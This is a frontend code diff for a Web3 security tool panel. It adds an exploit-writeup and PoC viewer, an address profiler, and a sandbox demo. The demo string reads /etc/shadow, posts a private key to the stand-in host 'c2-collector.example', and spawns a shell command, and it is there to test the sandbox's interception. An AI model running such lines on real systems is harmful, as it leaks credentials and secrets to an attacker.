@@ -22,6 +22,8 @@ import {
   Radar,
   Zap,
   Terminal,
+  UserCheck,
+  BookOpen,
 } from "lucide-react";
 import {
   getSavedUser,
@@ -29,6 +31,7 @@ import {
   apiGetToolHistory,
   apiGetToolHistoryItem,
   apiGetOspecFindingDetail,
+  apiGetHackWriteup,
   type BorisUser,
   type BorisToolHistoryItem,
 } from "@/lib/auth";
@@ -48,6 +51,7 @@ type ToolId =
   | "proxy"
   | "surface"
   | "flash"
+  | "deployer"
   | "sandbox";
 
 const TIER_RANK: Record<string, number> = { GUEST: 0, RADAR: 1, RAW: 2, BLACKBOX: 3 };
@@ -80,6 +84,31 @@ const ToolsPanel = () => {
   const [loadingFindingId, setLoadingFindingId] = useState<number | null>(null);
   const [copiedSecretId, setCopiedSecretId] = useState<string | null>(null);
   const [openedHistoryBanner, setOpenedHistoryBanner] = useState<string | null>(null);
+
+  // Full Markdown Writeup viewer for the 1,678 Deep Exploits DB
+  const [expandedWriteupSlug, setExpandedWriteupSlug] = useState<string | null>(null);
+  const [writeupCache, setWriteupCache] = useState<Record<string, any>>({});
+  const [loadingWriteupSlug, setLoadingWriteupSlug] = useState<string | null>(null);
+
+  const handleToggleWriteup = async (slug: string, title?: string) => {
+    const key = slug || title || "";
+    if (!key) return;
+    if (expandedWriteupSlug === key && writeupCache[key]) {
+      setExpandedWriteupSlug(null);
+      return;
+    }
+    setExpandedWriteupSlug(key);
+    if (writeupCache[key]) return;
+    setLoadingWriteupSlug(key);
+    try {
+      const data = await apiGetHackWriteup(slug, title);
+      setWriteupCache((prev) => ({ ...prev, [key]: data }));
+    } catch (e: any) {
+      setWriteupCache((prev) => ({ ...prev, [key]: { error: e.message } }));
+    } finally {
+      setLoadingWriteupSlug(null);
+    }
+  };
 
   const skipAutoOspecRef = useRef<boolean>(false);
   const resultsTopRef = useRef<HTMLDivElement | null>(null);
@@ -172,13 +201,14 @@ const ToolsPanel = () => {
     { id: "social", labelRu: "Social & OSINT", labelEn: "Social & OSINT", icon: Globe, minRank: 0, placeholder: "@handle, org/repo, t.me/..., x.com/..." },
     { id: "soroban", labelRu: "Soroban / Stellar", labelEn: "Soroban / Stellar", icon: Compass, minRank: 0, placeholder: "USDC, AQUA, CODE:ISSUER, C..." },
     { id: "ospec", labelRu: "OSPEC (Утечки 1.1M)", labelEn: "OSPEC (1.1M Secrets)", icon: KeyRound, minRank: 1, placeholder: "Фильтр по типу секрета или org/repo (пусто = последние находки)" },
-    { id: "hacks", labelRu: "DeFiHackLabs (861 взломов)", labelEn: "DeFiHackLabs (861 Exploits)", icon: Flame, minRank: 1, placeholder: "0x1F98431c8aD98523631AE4a59f267346ea31F984" },
+    { id: "hacks", labelRu: "База 2,539 взломов (1,678 разборов + PoC)", labelEn: "2,539 Exploits DB (1,678 Writeups + PoC)", icon: Flame, minRank: 1, placeholder: "0x... контракт ИЛИ поиск по 1,678 разборам: uranium, euler, curve, slot0, reentrancy" },
+    { id: "deployer", labelRu: "Деплоер & Профайлер Адреса", labelEn: "Deployer & Address Profiler", icon: UserCheck, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (1 или несколько 0x-адресов)" },
     { id: "proxy", labelRu: "Proxy & EIP-1967 Инспектор", labelEn: "Proxy & EIP-1967 Inspector", icon: Layers, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
     { id: "flash", labelRu: "Flash-Loan & Spot-Оракул", labelEn: "Flash-Loan & Spot Oracle", icon: Zap, minRank: 1, placeholder: "0x1F98431c8aD98523631AE4a59f267346ea31F984" },
     { id: "surface", labelRu: "Web3 Surface Mapper (Домен)", labelEn: "Web3 Surface Mapper (Domain)", icon: Radar, minRank: 1, placeholder: "across.to / rhino.fi / app.uniswap.org" },
     { id: "drift", labelRu: "Audit Drift (Репозиторий)", labelEn: "Audit Drift (Repo Audits)", icon: GitCompare, minRank: 1, placeholder: "https://github.com/Uniswap/v4-core или org/repo" },
     { id: "zk", labelRu: "ZK / Groth16 аудит", labelEn: "ZK Groth16 Audit", icon: ShieldCheck, minRank: 2, placeholder: "0x... verifier" },
-    { id: "sandbox", labelRu: "Matrix Sandbox v2.2", labelEn: "Matrix Sandbox v2.2", icon: Terminal, minRank: 2, placeholder: "import requests, subprocess..." },
+    { id: "sandbox", labelRu: "Matrix Sandbox v16.2", labelEn: "Matrix Sandbox v16.2", icon: Terminal, minRank: 2, placeholder: "import requests, subprocess..." },
   ];
 
   const run = async () => {
@@ -221,6 +251,9 @@ const ToolsPanel = () => {
         body = { domain: input1.trim() };
       } else if (tool === "flash") {
         path = "/api/tools/flash-spot";
+        body = { address: input1.trim(), chain };
+      } else if (tool === "deployer") {
+        path = "/api/tools/address-profile";
         body = { address: input1.trim(), chain };
       } else if (tool === "sandbox") {
         path = "/api/tools/sandbox";
@@ -377,16 +410,16 @@ const ToolsPanel = () => {
                   type="button"
                   onClick={() =>
                     setInput1(
-                      `import requests, subprocess\n# Suspicious helper trying to exfiltrate private key & run shell\nrequests.post("https://c2-collector.example/drop", json={"pk": "0xdeadbeef"})\nsubprocess.run(["uname", "-a"])\nprint(" Helper finished")`
+                      `import requests, subprocess\n# Matrix Sandbox v16.2 Demo: secret file read + C2 exfil + shell spawn\ntry:\n    open("/etc/shadow").read()\nexcept Exception as e:\n    print("Blocked secret file:", e)\nrequests.post("https://c2-collector.example/drop", json={"pk": "0xdeadbeef"})\nsubprocess.run(["id"])\nprint("Sandbox execution finished")`
                     )
                   }
                   className="rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 text-[11px] font-semibold text-primary hover:bg-primary hover:text-primary-foreground"
                 >
-                  {isRu ? "⚡ Вставить демо-пример эксфильтрации" : "⚡ Load Demo Exfiltration Script"}
+                  {isRu ? "⚡ Вставить демо-тест Matrix v16.2" : "⚡ Load Matrix v16.2 Demo"}
                 </button>
               </div>
               <textarea
-                rows={5}
+                rows={6}
                 value={input1}
                 onChange={(e) => setInput1(e.target.value)}
                 placeholder={active.placeholder}
@@ -399,7 +432,7 @@ const ToolsPanel = () => {
                   className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-5 py-2.5 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
                 >
                   {loading ? <Loader2 size={14} className="animate-spin" /> : <Terminal size={14} />}
-                  <span>{loading ? (isRu ? "Перехват вызовов…" : "Intercepting…") : isRu ? "Запустить в Matrix Sandbox" : "Run in Matrix Sandbox"}</span>
+                  <span>{loading ? (isRu ? "Изоляция v16.2…" : "Isolating v16.2…") : isRu ? "Запустить в Matrix Sandbox v16.2" : "Run in Matrix Sandbox v16.2"}</span>
                 </button>
               </div>
             </div>
@@ -408,11 +441,11 @@ const ToolsPanel = () => {
               <input
                 value={input1}
                 onChange={(e) => setInput1(e.target.value)}
-                onKeyDown={(e) => e.key === "Enter" && (tool === "ospec" || input1) && run()}
+                onKeyDown={(e) => e.key === "Enter" && (tool === "ospec" || tool === "hacks" || input1) && run()}
                 placeholder={active.placeholder}
                 className="rounded-xl border border-border bg-background px-4 py-3 font-mono text-xs text-foreground outline-none focus:border-primary sm:col-span-2"
               />
-              {(tool === "holders" || tool === "funds" || tool === "zk" || tool === "hacks" || tool === "proxy" || tool === "flash") ? (
+              {(tool === "holders" || tool === "funds" || tool === "zk" || tool === "hacks" || tool === "proxy" || tool === "flash" || tool === "deployer") ? (
                 <select
                   value={chain}
                   onChange={(e) => setChain(e.target.value)}
@@ -441,12 +474,38 @@ const ToolsPanel = () => {
               )}
               <button
                 onClick={run}
-                disabled={loading || (tool !== "ospec" && !input1)}
+                disabled={loading || (tool !== "ospec" && tool !== "hacks" && !input1)}
                 className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
               >
                 {loading ? <Loader2 size={14} className="animate-spin" /> : <Search size={14} />}
                 <span>{loading ? (isRu ? "Считаю…" : "Running…") : isRu ? "Запустить" : "Run"}</span>
               </button>
+            </div>
+          )}
+
+          {/* Quick presets for 2,539 Exploits DB (1,678 Deep Writeups + 861 DeFiHackLabs) */}
+          {tool === "hacks" && (
+            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
+              <span className="text-muted-foreground">
+                {isRu ? "Быстрый поиск по 1,678 разборам или 0x-контракту:" : "Quick search across 1,678 writeups or 0x contract:"}
+              </span>
+              {[
+                { label: "Uranium ($50M K-Check)", val: "uranium" },
+                { label: "Euler Finance", val: "euler" },
+                { label: "Curve / Vyper Reentrancy", val: "curve" },
+                { label: "UniV3 slot0 Oracle", val: "slot0" },
+                { label: "Cross-Chain Bridges", val: "vuln/bridge" },
+                { label: "0x1F98...F984 (UniV3 Factory)", val: "0x1F98431c8aD98523631AE4a59f267346ea31F984" },
+              ].map((p) => (
+                <button
+                  key={p.val}
+                  type="button"
+                  onClick={() => setInput1(p.val)}
+                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
+                >
+                  {p.label}
+                </button>
+              ))}
             </div>
           )}
 
@@ -1184,67 +1243,205 @@ const ToolsPanel = () => {
         </div>
       )}
 
-      {/* 9. DeFiHackLabs Pattern Matcher (861 Historical Exploits) */}
+      {/* 9. 2,539 Exploits DB (1,678 Deep Writeups + 861 DeFiHackLabs) */}
       {result && tool === "hacks" && (
         <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
           <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
             <div>
-              <span className="text-primary font-bold">{result.target}</span>
-              <span className="ml-2 text-muted-foreground">({result.chain})</span>
+              <span className="text-primary font-bold">
+                {result.mode === "kb_search" ? `KB Query: ${result.query}` : result.target}
+              </span>
+              {result.chain && <span className="ml-2 text-muted-foreground">({result.chain})</span>}
             </div>
             <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
-              {result.verdict} · Score: {result.total_pattern_risk}
+              {result.verdict} {result.total_pattern_risk !== undefined ? `· Score: ${result.total_pattern_risk}` : ""}
             </span>
           </div>
 
-          <div className="grid grid-cols-2 gap-3 sm:grid-cols-3">
+          <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
             <div className="rounded-lg border border-border bg-background p-3">
-              <p className="text-[10px] uppercase text-muted-foreground">{isRu ? "База эксплойтов" : "Exploit DB"}</p>
-              <p className="mt-1 text-sm font-bold text-foreground">{result.total_incidents_in_db || 861} incidents</p>
+              <p className="text-[10px] uppercase text-muted-foreground">
+                {isRu ? "База подробных разборов (PoC)" : "Deep Writeups DB (PoC)"}
+              </p>
+              <p className="mt-1 text-sm font-bold text-primary">
+                {result.total_writeups_db || 1678} writeups
+              </p>
             </div>
             <div className="rounded-lg border border-border bg-background p-3">
-              <p className="text-[10px] uppercase text-muted-foreground">{isRu ? "Совпавших векторов" : "Matched Vectors"}</p>
-              <p className="mt-1 text-sm font-bold text-primary">{(result.matched_patterns || []).length}</p>
+              <p className="text-[10px] uppercase text-muted-foreground">DeFiHackLabs Index</p>
+              <p className="mt-1 text-sm font-bold text-foreground">
+                {result.total_defihacklabs_db || 861} exploits
+              </p>
             </div>
-            <div className="rounded-lg border border-border bg-background p-3 col-span-2 sm:col-span-1">
-              <p className="text-[10px] uppercase text-muted-foreground">{isRu ? "Рекомендация" : "Recommendation"}</p>
-              <p className="mt-1 text-xs font-semibold text-foreground">{result.recommendation}</p>
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">
+                {isRu ? "Суммарная база знаний" : "Combined Exploit KB"}
+              </p>
+              <p className="mt-1 text-sm font-bold text-green-400">
+                {result.total_combined_db || result.total_incidents_in_db || 2539} total incidents
+              </p>
             </div>
           </div>
 
-          <div className="space-y-3">
-            {(result.matched_patterns || []).map((mp: any, idx: number) => (
-              <div key={idx} className="rounded-lg border border-border bg-background p-3.5 space-y-2">
-                <div className="flex flex-wrap items-center justify-between gap-2">
-                  <div className="flex items-center gap-2">
-                    <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
-                      Score {mp.score} (hits: {mp.hits})
-                    </span>
-                    <span className="font-bold text-foreground">{mp.attack_type}</span>
-                  </div>
-                  <code className="text-[10px] text-muted-foreground">{mp.pattern}</code>
-                </div>
-                <p className="text-[11px] text-muted-foreground">{mp.note}</p>
-
-                {Array.isArray(mp.related_hacks) && mp.related_hacks.length > 0 && (
-                  <div className="mt-2 border-t border-border/60 pt-2">
-                    <p className="mb-1.5 text-[10px] uppercase text-primary font-semibold">
-                      {isRu ? "Исторические прецеденты из DeFiHackLabs:" : "Historical Precedents (DeFiHackLabs):"}
-                    </p>
-                    <div className="grid grid-cols-1 gap-1.5 sm:grid-cols-2">
-                      {mp.related_hacks.map((h: any, hi: number) => (
-                        <div key={hi} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
-                          <span className="font-semibold text-foreground truncate">{h.protocol}</span>
-                          <span className="text-red-400 font-bold">{h.lost}</span>
-                          <span className="text-[10px] text-muted-foreground">{h.date}</span>
+          {/* MODE A: Direct Search across 1,678 Deep Writeups */}
+          {result.mode === "kb_search" && Array.isArray(result.writeups) && (
+            <div className="space-y-3">
+              {result.writeups.map((w: any, idx: number) => {
+                const wKey = w.slug || w.title || String(idx);
+                const isOpen = expandedWriteupSlug === wKey;
+                const wData = writeupCache[wKey];
+                return (
+                  <div key={idx} className="rounded-lg border border-border bg-background p-4 space-y-2">
+                    <div className="flex flex-wrap items-start justify-between gap-2">
+                      <div>
+                        <div className="flex flex-wrap items-center gap-2">
+                          <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
+                            {w.chain || "EVM"}
+                          </span>
+                          <span className="text-[10px] text-muted-foreground">{w.date}</span>
+                          <span className="font-bold text-sm text-foreground">{w.title}</span>
                         </div>
-                      ))}
+                        {w.loss && (
+                          <p className="mt-1 text-[11px] font-bold text-red-400">
+                            💥 Loss: {w.loss}
+                          </p>
+                        )}
+                      </div>
+                      <button
+                        type="button"
+                        onClick={() => handleToggleWriteup(w.slug, w.title)}
+                        className="inline-flex items-center gap-1.5 rounded-lg bg-primary px-3 py-1.5 text-[11px] font-semibold text-primary-foreground hover:bg-primary-dim"
+                      >
+                        <BookOpen size={12} />
+                        <span>
+                          {loadingWriteupSlug === wKey
+                            ? isRu ? "Загрузка…" : "Loading…"
+                            : isOpen
+                            ? isRu ? "Скрыть разбор" : "Hide Writeup"
+                            : isRu ? "Открыть разбор & PoC" : "Open Writeup & PoC"}
+                        </span>
+                      </button>
                     </div>
+
+                    {w.description && (
+                      <p className="text-[11px] text-muted-foreground leading-relaxed">{w.description}</p>
+                    )}
+
+                    {Array.isArray(w.tags) && w.tags.length > 0 && (
+                      <div className="flex flex-wrap gap-1.5 pt-1">
+                        {w.tags.map((tg: string, ti: number) => (
+                          <span
+                            key={ti}
+                            className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground"
+                          >
+                            {tg}
+                          </span>
+                        ))}
+                      </div>
+                    )}
+
+                    {isOpen && wData && (
+                      <div className="mt-3 rounded-xl border border-primary/40 bg-card p-4 space-y-2">
+                        {wData.error ? (
+                          <p className="text-red-400">⚠️ {wData.error}</p>
+                        ) : (
+                          <>
+                            <div className="flex items-center justify-between border-b border-border pb-2">
+                              <span className="text-[11px] font-bold text-primary">
+                                📄 {wData.file}
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => navigator.clipboard.writeText(wData.markdown || "")}
+                                className="rounded border border-border bg-background px-2.5 py-1 text-[10px] text-muted-foreground hover:border-primary hover:text-primary"
+                              >
+                                {isRu ? "Скопировать весь разбор + PoC" : "Copy Writeup + PoC"}
+                              </button>
+                            </div>
+                            <pre className="max-h-96 overflow-y-auto whitespace-pre-wrap text-[11px] text-foreground leading-relaxed">
+                              {wData.markdown}
+                            </pre>
+                          </>
+                        )}
+                      </div>
+                    )}
                   </div>
-                )}
-              </div>
-            ))}
-          </div>
+                );
+              })}
+            </div>
+          )}
+
+          {/* MODE B: 0x Contract Source Cross-Reference */}
+          {result.mode !== "kb_search" && (
+            <div className="space-y-3">
+              {(result.matched_patterns || []).map((mp: any, idx: number) => (
+                <div key={idx} className="rounded-lg border border-border bg-background p-3.5 space-y-2">
+                  <div className="flex flex-wrap items-center justify-between gap-2">
+                    <div className="flex items-center gap-2">
+                      <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
+                        Score {mp.score} (hits: {mp.hits})
+                      </span>
+                      <span className="font-bold text-foreground">{mp.attack_type}</span>
+                    </div>
+                    <code className="text-[10px] text-muted-foreground">{mp.pattern}</code>
+                  </div>
+                  <p className="text-[11px] text-muted-foreground">{mp.note}</p>
+
+                  {/* Deep Writeups from the 1,678 DB */}
+                  {Array.isArray(mp.deep_writeups) && mp.deep_writeups.length > 0 && (
+                    <div className="mt-2 border-t border-border/60 pt-2 space-y-2">
+                      <p className="text-[10px] uppercase text-primary font-semibold">
+                        {isRu ? "Подробные разборы и Foundry PoC из базы 1,678 взломов:" : "Deep Writeups & Foundry PoCs (1,678 DB):"}
+                      </p>
+                      {mp.deep_writeups.map((dw: any, di: number) => {
+                        const wKey = dw.slug || dw.title || `${idx}_${di}`;
+                        const isOpen = expandedWriteupSlug === wKey;
+                        const wData = writeupCache[wKey];
+                        return (
+                          <div key={di} className="rounded border border-border bg-card p-2.5 space-y-1.5">
+                            <div className="flex flex-wrap items-center justify-between gap-2">
+                              <span className="font-bold text-foreground">{dw.title}</span>
+                              <button
+                                type="button"
+                                onClick={() => handleToggleWriteup(dw.slug, dw.title)}
+                                className="inline-flex items-center gap-1 rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-[10px] font-bold text-primary hover:bg-primary hover:text-primary-foreground"
+                              >
+                                <BookOpen size={11} />
+                                <span>{isOpen ? (isRu ? "Скрыть PoC" : "Hide PoC") : isRu ? "Разбор & PoC" : "Writeup & PoC"}</span>
+                              </button>
+                            </div>
+                            {dw.loss && <p className="text-[10px] text-red-400">Loss: {dw.loss}</p>}
+                            {isOpen && wData?.markdown && (
+                              <pre className="mt-2 max-h-80 overflow-y-auto rounded border border-border bg-background p-3 whitespace-pre-wrap text-[11px] text-foreground">
+                                {wData.markdown}
+                              </pre>
+                            )}
+                          </div>
+                        );
+                      })}
+                    </div>
+                  )}
+
+                  {Array.isArray(mp.related_hacks) && mp.related_hacks.length > 0 && (
+                    <div className="mt-2 border-t border-border/60 pt-2">
+                      <p className="mb-1.5 text-[10px] uppercase text-muted-foreground font-semibold">
+                        {isRu ? "Дополнительные инциденты из DeFiHackLabs (861):" : "Additional Precedents (DeFiHackLabs 861):"}
+                      </p>
+                      <div className="grid grid-cols-1 gap-1.5 sm:grid-cols-2">
+                        {mp.related_hacks.map((h: any, hi: number) => (
+                          <div key={hi} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
+                            <span className="font-semibold text-foreground truncate">{h.protocol}</span>
+                            <span className="text-red-400 font-bold">{h.lost}</span>
+                            <span className="text-[10px] text-muted-foreground">{h.date}</span>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+                  )}
+                </div>
+              ))}
+            </div>
+          )}
         </div>
       )}
 
@@ -1495,14 +1692,21 @@ const ToolsPanel = () => {
         </div>
       )}
 
-      {/* 13. Matrix Sandbox v2.2 (Call Interceptor) */}
+      {/* 13. Matrix Sandbox v16.2 (Isolated Process + AuditHook + Honeypot) */}
       {result && tool === "sandbox" && (
         <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
           <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
-            <span className="font-bold text-foreground">Matrix Sandbox v2.2 ({result.status})</span>
+            <div className="flex items-center gap-2">
+              <span className="font-bold text-foreground">
+                Matrix Sandbox v16.2 ({result.status || "PASS"})
+              </span>
+              <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
+                ENGINE: {result.engine || "matrix_sandbox_v16_2"}
+              </span>
+            </div>
             <span
               className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
-                String(result.verdict).startsWith("CRITICAL")
+                String(result.verdict).startsWith("CRITICAL") || String(result.verdict).startsWith("HIGH")
                   ? "border-red-500/50 bg-red-500/15 text-red-400"
                   : "border-green-500/50 bg-green-500/15 text-green-400"
               }`}
@@ -1511,16 +1715,18 @@ const ToolsPanel = () => {
             </span>
           </div>
 
-          <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
+          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
             <div className="rounded-lg border border-border bg-background p-3">
-              <p className="text-[10px] uppercase text-muted-foreground">Imports Found</p>
-              <p className="mt-1 font-bold text-foreground">
-                {(result.imports_found || []).join(", ") || "None"}
-              </p>
+              <p className="text-[10px] uppercase text-muted-foreground">Blocked Hostile Ops</p>
+              <p className="mt-1 text-sm font-bold text-red-400">{result.blocked_count ?? 0}</p>
             </div>
             <div className="rounded-lg border border-border bg-background p-3">
-              <p className="text-[10px] uppercase text-muted-foreground">Dangerous Modules Mocked</p>
-              <p className="mt-1 font-bold text-primary">
+              <p className="text-[10px] uppercase text-muted-foreground">Honeypot Simulated</p>
+              <p className="mt-1 text-sm font-bold text-amber-400">{result.simulated_count ?? result.intercepted_count ?? 0}</p>
+            </div>
+            <div className="rounded-lg border border-border bg-background p-3 col-span-2">
+              <p className="text-[10px] uppercase text-muted-foreground">Intercepted Subsystems</p>
+              <p className="mt-1 truncate font-bold text-primary">
                 {(result.dangerous_mocked || []).join(", ") || "None"}
               </p>
             </div>
@@ -1529,8 +1735,8 @@ const ToolsPanel = () => {
           <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
             <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
               {isRu
-                ? `Перехваченные системные и сетевые вызовы (${result.intercepted_count || 0}):`
-                : `Intercepted System & Network Calls (${result.intercepted_count || 0}):`}
+                ? `Телеметрия перехваченных вызовов Matrix v16.2 (${result.intercepted_count || 0}):`
+                : `Matrix v16.2 Intercepted Call Telemetry (${result.intercepted_count || 0}):`}
             </p>
             {(result.intercepted_calls || []).length === 0 ? (
               <p className="text-[11px] text-muted-foreground">
@@ -1540,11 +1746,22 @@ const ToolsPanel = () => {
               <div className="space-y-1.5 max-h-60 overflow-y-auto">
                 {(result.intercepted_calls || []).map((ic: any, idx: number) => (
                   <div key={idx} className="flex flex-wrap items-center justify-between gap-2 rounded border border-red-500/30 bg-red-500/5 px-3 py-1.5 text-[11px]">
-                    <span className="font-bold text-red-400">
-                      [{ic.module}] → {ic.call}
-                    </span>
+                    <div className="flex items-center gap-2">
+                      <span
+                        className={`rounded px-1.5 py-0.5 text-[9px] font-bold uppercase ${
+                          ic.classification === "BLOCKED"
+                            ? "bg-red-500/25 text-red-300"
+                            : "bg-amber-500/20 text-amber-300"
+                        }`}
+                      >
+                        {ic.classification || "SIMULATED"}
+                      </span>
+                      <span className="font-bold text-red-400">
+                        {ic.call}
+                      </span>
+                    </div>
                     <code className="text-foreground break-all">
-                      {Array.isArray(ic.args) ? ic.args.join(", ") : JSON.stringify(ic.args)}
+                      {Array.isArray(ic.args) ? ic.args.join(" · ") : JSON.stringify(ic.args)}
                     </code>
                   </div>
                 ))}
@@ -1559,6 +1776,127 @@ const ToolsPanel = () => {
                 {result.stdout}
                 {result.stderr ? `\n[stderr] ${result.stderr}` : ""}
               </pre>
+            </div>
+          )}
+        </div>
+      )}
+
+      {/* 14. Deployer & On-Chain Address Profiler (address_profiler.py + deploy_analyzer.py) */}
+      {result && tool === "deployer" && result.primary && (
+        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
+          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
+            <div className="flex flex-wrap items-center gap-2">
+              <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold uppercase text-primary">
+                {result.primary.type || "ADDRESS"}
+              </span>
+              <span className="text-primary font-bold">{result.primary.address}</span>
+              <span className="text-muted-foreground">({String(result.primary.chain || "").toUpperCase()})</span>
+            </div>
+            <span className="rounded border border-border bg-background px-2.5 py-0.5 text-[11px] font-bold text-foreground">
+              Risk: {result.primary.risk_level || "LOW"}
+            </span>
+          </div>
+
+          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">Contract / Entity Name</p>
+              <p className="mt-1 truncate font-bold text-foreground">
+                {result.primary.known_label || result.primary.contract_name || "Unlabeled"}
+              </p>
+              <p className="mt-0.5 text-[10px] text-muted-foreground">
+                {result.primary.category || "general"} · {result.primary.pattern || "standard"}
+              </p>
+            </div>
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">Age & Verification</p>
+              <p className="mt-1 font-bold text-foreground">
+                {result.primary.age_days !== null && result.primary.age_days !== undefined
+                  ? `${result.primary.age_days} days`
+                  : "—"}
+              </p>
+              <p className="mt-0.5 text-[10px] text-muted-foreground">
+                Verified: {result.primary.verified ? "✅ YES" : "❌ NO"}
+              </p>
+            </div>
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">Native Balance / Txs</p>
+              <p className="mt-1 font-bold text-foreground">
+                {Number(result.primary.balance_native || 0).toFixed(4)} ETH/Native
+              </p>
+              <p className="mt-0.5 text-[10px] text-muted-foreground">
+                Tx Count: {result.primary.tx_count ?? 0}
+              </p>
+            </div>
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">Proxy / Implementation</p>
+              <p className="mt-1 truncate font-bold text-primary">
+                {result.primary.is_proxy ? (result.primary.implementation || "Proxy") : "Standalone"}
+              </p>
+              <p className="mt-0.5 text-[10px] text-muted-foreground">
+                Created: {result.primary.creation_time ? String(result.primary.creation_time).slice(0, 10) : "—"}
+              </p>
+            </div>
+          </div>
+
+          {/* Creator / Deployer Wallet Intelligence */}
+          {result.primary.creator && (
+            <div className="rounded-lg border border-primary/30 bg-background p-4 space-y-2">
+              <div className="flex flex-wrap items-center justify-between gap-2">
+                <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
+                  👤 {isRu ? "Досье кошелька Деплоера (Creator EOA / Multisig):" : "Deployer Wallet Intelligence (Creator):"}
+                </span>
+                {result.primary.creation_tx && (
+                  <span className="truncate text-[10px] text-muted-foreground">
+                    Deploy Tx: {result.primary.creation_tx.slice(0, 18)}…
+                  </span>
+                )}
+              </div>
+              <div className="flex flex-wrap items-center justify-between gap-3">
+                <code className="font-bold text-foreground select-all">{result.primary.creator}</code>
+                {result.primary.creator_profile && (
+                  <div className="flex flex-wrap gap-3 text-[11px] text-muted-foreground">
+                    <span>
+                      Type: <b className="text-foreground">{String(result.primary.creator_profile.type).toUpperCase()}</b>
+                    </span>
+                    <span>
+                      Balance: <b className="text-foreground">{Number(result.primary.creator_profile.balance_native || 0).toFixed(4)}</b>
+                    </span>
+                    <span>
+                      Txs: <b className="text-foreground">{result.primary.creator_profile.tx_count ?? 0}</b>
+                    </span>
+                    {result.primary.creator_profile.age_days !== null && (
+                      <span>
+                        Age: <b className="text-foreground">{result.primary.creator_profile.age_days}d</b>
+                      </span>
+                    )}
+                  </div>
+                )}
+              </div>
+            </div>
+          )}
+
+          {/* Security Notes & Exposed ABI Functions */}
+          {Array.isArray(result.primary.security_notes) && result.primary.security_notes.length > 0 && (
+            <div className="rounded-lg border border-border bg-background p-3.5 space-y-1">
+              <p className="text-[10px] uppercase text-primary font-bold">Security Observations</p>
+              {result.primary.security_notes.map((sn: string, idx: number) => (
+                <p key={idx} className="text-[11px] text-foreground">• {sn}</p>
+              ))}
+            </div>
+          )}
+
+          {Array.isArray(result.primary.abi_functions) && result.primary.abi_functions.length > 0 && (
+            <div className="rounded-lg border border-border bg-background p-3.5">
+              <p className="mb-2 text-[10px] uppercase text-muted-foreground font-bold">
+                Exposed ABI Functions ({result.primary.abi_functions.length})
+              </p>
+              <div className="flex flex-wrap gap-1.5 max-h-36 overflow-y-auto">
+                {result.primary.abi_functions.slice(0, 40).map((fn: string, idx: number) => (
+                  <code key={idx} className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-foreground">
+                    {fn}
+                  </code>
+                ))}
+              </div>
             </div>
           )}
         </div>
@@ -1584,11 +1922,12 @@ const ToolsPanel = () => {
               { id: "social", label: "Social" },
               { id: "soroban", label: "Soroban" },
               { id: "ospec", label: "OSPEC" },
-              { id: "hacks", label: "DeFiHackLabs" },
+              { id: "hacks", label: "2,539 Exploits DB" },
+              { id: "deployer", label: "Deployer" },
               { id: "proxy", label: "Proxy" },
               { id: "flash", label: "Flash/Spot" },
               { id: "surface", label: "Surface" },
-              { id: "sandbox", label: "Sandbox" },
+              { id: "sandbox", label: "Sandbox v16.2" },
             ].map((f) => (
               <button
                 key={f.id}
